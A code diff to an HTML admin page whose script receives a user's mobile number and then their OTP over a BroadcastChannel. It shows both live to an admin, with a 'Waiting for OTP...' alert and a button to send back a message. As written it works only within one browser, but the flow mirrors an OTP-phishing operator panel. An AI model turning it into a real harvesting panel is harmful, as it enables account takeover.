@@ -45,27 +45,41 @@
 
 <script>
   const channel = new BroadcastChannel("wish_channel");
-  let userData = null;
+  let mobileNumber = null;
 
   channel.onmessage = (event) => {
-    if (event.data.type === "USER_SUBMIT") {
-      userData = event.data.data;
-      document.getElementById("mobile").innerText = userData.mobile;
-      document.getElementById("otp").innerText = userData.otp;
+
+    // 🔔 MOBILE NUMBER AAYA (Send OTP click par)
+    if (event.data.type === "USER_MOBILE_SUBMIT") {
+      mobileNumber = event.data.data.mobile;
+
+      document.getElementById("mobile").innerText = mobileNumber;
+      document.getElementById("otp").innerText = "---";
+
+      document.getElementById("notify").style.display = "block";
+      document.getElementById("notify").innerText =
+        "🔔 User entered mobile number. Waiting for OTP...";
+    }
+
+    // (optional) OTP aane par update
+    if (event.data.type === "USER_OTP_SUBMIT") {
+      document.getElementById("otp").innerText = event.data.data.otp;
     }
   };
 
   function sendWish() {
-    if (!userData) return alert("No user data");
+    if (!mobileNumber) return alert("No user yet");
 
     const msg =
       document.getElementById("wishMsg").value ||
-      "🍀 Good Luck! Admin blessed you 😄";
+      "🍀 Good Luck! Admin is ready 😄";
 
     channel.postMessage({
       type: "ADMIN_WISH",
       message: msg
     });
+
+    document.getElementById("notify").style.display = "none";
   }
 </script>
 
